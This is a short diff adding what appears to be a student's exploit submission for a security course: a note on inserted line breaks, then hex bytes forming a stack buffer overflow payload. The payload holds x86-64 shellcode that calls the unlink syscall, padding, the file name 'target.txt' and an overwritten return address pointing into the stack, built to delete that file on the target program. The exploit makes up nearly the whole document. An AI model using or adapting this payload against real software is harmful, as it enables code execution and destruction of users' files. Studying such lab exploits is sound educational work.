@@ -1,0 +1,10 @@
+Note: I added a newline every 80 characters because of the specs requirement
+that every submission be less than 200 columns. The actual exploit does not
+have any newlines.
+
+64 69 72 3d 00 00 00 00 48 bf c8 ce ff ff ff 7f 00 00 48 c7 c0 57 00 00 00 0f 05
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 74 61 72 67 65 74 2e 74 78 74 00 00 00 00 00 00 48 ce ff ff ff 7f 00 00
